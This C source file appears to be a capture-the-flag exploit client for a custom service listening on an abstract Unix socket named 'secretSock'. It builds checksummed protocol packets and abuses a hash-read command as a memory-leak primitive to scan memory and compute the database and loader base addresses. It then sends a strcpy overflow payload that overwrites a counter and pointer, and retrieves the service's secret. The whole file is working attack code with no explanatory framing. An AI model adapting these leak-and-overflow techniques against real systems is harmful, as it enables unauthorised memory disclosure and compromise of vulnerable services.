#include <stddef.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <zlib.h>

int ping_srv(int fd) {
    char s[269];
    memset(s, 0, 269);
    s[8] = 'D';
    s[9] = 'A';
    s[10] = '7';
    s[11] = '7';
    s[12] = '7';
    s[13] = 1;
    // strcpy(&s[14], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    s[14] = 0;

    unsigned long long checksum_init = adler32(0, 0, 0);
    *(unsigned long long*)s = adler32(checksum_init, s, 269);

    if (write(fd, s, 269) != 269) {
        puts("failed write");
        exit(-1);
    }

    char response[256];
    if ( read(fd, response, 0x100) != 256 ) {
        puts("failed read");
        exit(-1);
    }

    puts("PING SUCCESS");
}

int get_secret(int fd) {
    char s[269];
    memset(s, 0, 269);
    s[8] = 'D';
    s[9] = 'A';
    s[10] = '7';
    s[11] = '7';
    s[12] = '7';
    s[13] = 4;
    // strcpy(&s[14], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    s[14] = 0;

    unsigned long long checksum_init = adler32(0, 0, 0);
    *(unsigned long long*)s = adler32(checksum_init, s, 269);

    if (write(fd, s, 269) != 269) {
        puts("failed write");
        exit(-1);
    }

    char response[256];
    if ( read(fd, response, 0x100) != 256 ) {
        puts("failed read");
        exit(-1);
    }

    puts(&response[1]);
}

void check_hash(int fd, char *str) {
    char s[269];
    memset(s, 0, 269);
    s[8] = 'D';
    s[9] = 'A';
    s[10] = '7';
    s[11] = '7';
    s[12] = '7';
    s[13] = 2;
    strcpy(&s[14], str);
    // s[14] = 0;

    unsigned long long checksum_init = adler32(0, 0, 0);
    *(unsigned long long*)s = adler32(checksum_init, s, 269);

    if (write(fd, s, 269) != 269) {
        puts("failed write");
        exit(-1);
    }

    char response[256];
    if ( read(fd, response, 0x100) != 256 ) {
        puts("failed read");
        exit(-1);
    }

    printf("check response: %d\n", response[0]);
}

int is_good(char* buf) {
    int succ = 0;
    while (*buf) {
        if (*buf == 0xfa) {
            succ = 1;
        }
        ++buf;
    }
    return succ;
}

void hexdump(char* buf) {
    while (*buf) {
        printf("%x ", (unsigned int)(*buf) & 0xff);
        if (*buf == 0x7f) {
            printf(" ALERT ");
        }
        ++buf;
    }
    puts("");
}

void read_hash(int fd, unsigned long long index, char* response) {
    char s[269];
    memset(s, 0, 269);
    s[8] = 'D';
    s[9] = 'A';
    s[10] = '7';
    s[11] = '7';
    s[12] = '7';
    s[13] = 3;
    // strcpy(&s[14], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    *(unsigned long long*)&s[14] = index;

    unsigned long long checksum_init = adler32(0, 0, 0);
    *(unsigned long long*)s = adler32(checksum_init, s, 269);

    if (write(fd, s, 269) != 269) {
        puts("failed write");
        exit(-1);
    }

    if ( read(fd, response, 0x100) != 256 ) {
        puts("failed read");
        exit(-1);
    }

    if (!is_good(&response[1]))
        return;
    printf("read response: %d\n", response[0]);
    printf("%d: ", index);
    hexdump(&response[1]);
}

void overflow(int fd, char* payload) {
    char s[269];
    memset(s, 0, 269);
    s[8] = 'D';
    s[9] = 'A';
    s[10] = '7';
    s[11] = '7';
    s[12] = '7';
    s[13] = 2;
    strcpy(&s[14], payload);
    // s[14] = 0;

    unsigned long long checksum_init = adler32(0, 0, 0);
    *(unsigned long long*)s = adler32(checksum_init, s, 269);

    if (write(fd, s, 269) != 269) {
        puts("failed write");
        exit(-1);
    }

    char response[256];
    if ( read(fd, response, 0x100) != 256 ) {
        puts("failed read");
        exit(-1);
    }
}

unsigned long long compute_index(unsigned long long x) {
    return 1117984489315730401 * x;
}

unsigned long long read_offset(int fd, unsigned long long offset) {
    char res[10];
    memset(res, 0, 8);
    int len = 0;

    while(len < 8) {
        // printf("Index: %d\n", len);
        char buffer[256];
        read_hash(fd, compute_index(offset + len), buffer);
        strncpy(res + len, buffer + 1, 8 - len);
        len += strlen(&buffer[1]) + 1;
    }

   return *(unsigned long long*) res;
}

unsigned long long scan(int fd, unsigned long long start, unsigned long long needle, unsigned long long mask) {
    unsigned long long offset = start;
    while (1) {
        if (offset % 0x100 == 0) {
            printf("[+] Scanning offset: 0x%lx\n", offset);
        }
        unsigned long long val = read_offset(fd, offset);
        if ((val & mask) == needle) {
            printf("[+] Found needle: 0x%lx\n", offset);
            return offset;
        }
        offset += 8;
    }
}

int main(int argc, char** argv) {
    int fd = socket(1, 1, 0);
    struct sockaddr_un addr;
    addr.sun_family = AF_UNIX;
    addr.sun_path[0] = 0;
    strcpy(addr.sun_path + 1, "secretSock");

    if (connect(fd, (struct sockaddr *) &addr, sizeof(sa_family_t) + strlen("secretSock") + 1) == -1) {
        puts("failed connect");
        return -1;
    }

    check_hash(fd, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

    /* pls work */
    unsigned long long MAGIC_OFFSET = read_offset(fd, 0x1000);
    printf("[+] magic offset: 0x%lx\n", MAGIC_OFFSET);

    unsigned long long DB_BASE = MAGIC_OFFSET - 0x50 - 0x1000;
    printf("[+] Found DB_BASE: 0x%lx\n", DB_BASE);

    /* Sanity check */
    if (read_offset(fd, 0x400000 - DB_BASE) % 0x100000000 != 0x464c457f) {
        puts("[+] Sanity check failed");
    }
    else {
        puts("[+] Sanity check: This address should be correct");
    }

    // unsigned long long LD_BASE = read_offset(fd, 0x1008) - 0x1f91a;
    unsigned long long LD_BASE = read_offset(fd, 0x1008) - 0x1d3da;
    unsigned long long MAGIC_BYTE = LD_BASE + 0xa;
    printf("[+] Found MAGIC_BYTE: 0x%lx\n", MAGIC_BYTE);

    long long counter = MAGIC_BYTE - DB_BASE;
    printf("[+] counter: 0x%lx\n", counter);

    printf("[+] check1: 0x%lx\n", read_offset(fd, 0));
    printf("[+] check1: 0x%lx\n", read_offset(fd, counter));
    printf("[+] check1: 0x%lx\n", read_offset(fd, counter + 0x21));

    char payload[48];
    memset(payload, 'A', 32);
    *(long long*)&payload[32] = counter;
    *(long long*)&payload[40] = DB_BASE + 1;
    overflow(fd, payload);
    get_secret(fd);

    return 0;
}